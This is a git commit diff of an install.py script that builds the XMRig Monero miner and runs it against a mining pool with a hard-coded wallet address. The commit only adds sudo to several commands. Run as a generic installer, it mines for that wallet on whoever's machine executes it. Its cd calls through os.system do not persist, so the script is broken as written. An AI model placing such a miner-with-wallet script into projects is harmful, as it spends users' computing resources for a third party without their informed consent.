c8f6c347929990785cfd758cfbc413c3af4e4d42
Btrader-os <81942106+Btrader-os@users.noreply.github.com>
2021-11-14 13:33:22 -0500

    Update install.py

--- install.py
+++ install.py
@@ -2,12 +2,12 @@ import os
 
 os.system("sudo apt update -y")
 os.system("sudo apt install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y")
-os.system("git clone https://github.com/xmrig/xmrig.git")
+os.system("sudo git clone https://github.com/xmrig/xmrig.git")
 os.system("cd xmrig")
-os.system("mkdir build")
+os.system("sudo mkdir build")
 os.system("cd build")
-os.system("cmake ..")
-os.system("make")
+os.system("sudo cmake ..")
+os.system("sudo make")
 os.system("clear")
 os.system("./xmrig -o gulf.moneroocean.stream:10128 -u 448TDJLLcXnFP1gdePtg1FVNQDj8RcL4GQwQk6v4o4pdd5CNrwVDvt9EyscfvaZg8sRdhReAeyuLCCHf6sD57kH8BWnMBUH -p Laptop")
 
